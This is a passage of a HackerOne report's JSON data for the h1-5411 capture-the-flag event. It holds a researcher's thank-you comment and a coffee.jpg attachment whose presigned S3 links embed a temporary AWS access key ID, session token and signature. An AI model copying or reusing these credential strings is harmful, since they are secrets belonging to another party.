data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/370/888/21669665fa46012adf25845b18a41a6dfe96244c/coffee.jpg?response-content-disposition=attachment%3B%20filename%3D%22coffee.jpg%22%3B%20filename%2A%3DUTF-8%27%27coffee.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055441Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=32098d0800aa927ac247f798a2f2d642ba5df53b7e10e3164a19ea7a5c58e10b\" data-attachment-type=\"image/jpeg\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/370/888/21669665fa46012adf25845b18a41a6dfe96244c/coffee.jpg?response-content-disposition=attachment%3B%20filename%3D%22coffee.jpg%22%3B%20filename%2A%3DUTF-8%27%27coffee.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055441Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=32098d0800aa927ac247f798a2f2d642ba5df53b7e10e3164a19ea7a5c58e10b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSo thank you \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e and \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e for the great experience! I\u0026#39;m looking forward to the next challenge.\u003c/p\u003e\n\n\u003cp\u003eAlso ping \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e for h1-swag :)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-05T12:54:44.313Z","updated_at":"2018-11-05T12:54:44.313Z","actor":{"username":"osintopsec","cleared":true,"url":"/osintopsec","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":370888,"filename":"coffee.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/370/888/21669665fa46012adf25845b18a41a6dfe96244c/coffee.jpg?response-content-disposition=attachment%3B%20filename%3D%22coffee.jpg%22%3B%20filename%2A%3DUTF-8%27%27coffee.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055441Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=32098d0800aa927ac247f798a2f2d642ba5df53b7e10e3164a19ea7a5c58e10b"}],"genius_execution_id":null,"team_handle":"h1-5411-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}